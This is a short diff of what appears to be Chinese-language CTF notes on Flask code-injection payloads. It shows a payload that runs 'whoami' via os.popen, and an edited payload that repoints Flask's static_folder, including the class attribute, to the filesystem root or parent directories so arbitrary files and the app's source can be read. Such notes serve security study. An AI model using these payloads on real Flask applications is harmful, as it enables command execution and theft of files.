@@ -189,7 +189,7 @@ Response.default_mimetype=__import__('os').popen('whoami').read()
 改static_folder读任意文件
 
 ```py
-app.static_url_path="/static"（访问时需要url加的，这个属性run的时候就确定了，运行时改没用）;app.static_folder="/"（这个运行时改有用）   #然后static/app.py读源码
+app.static_url_path="/static"（访问时需要url加的，这个属性run的时候就直接注册到路由了，运行时改没用）;app.static_folder="/"（这个运行时改有用）;__import__('flask').Flask.static_folder = '../../../../../' (直接修改类静态属性)  #然后static/app.py读源码
 ```
 
 ```d
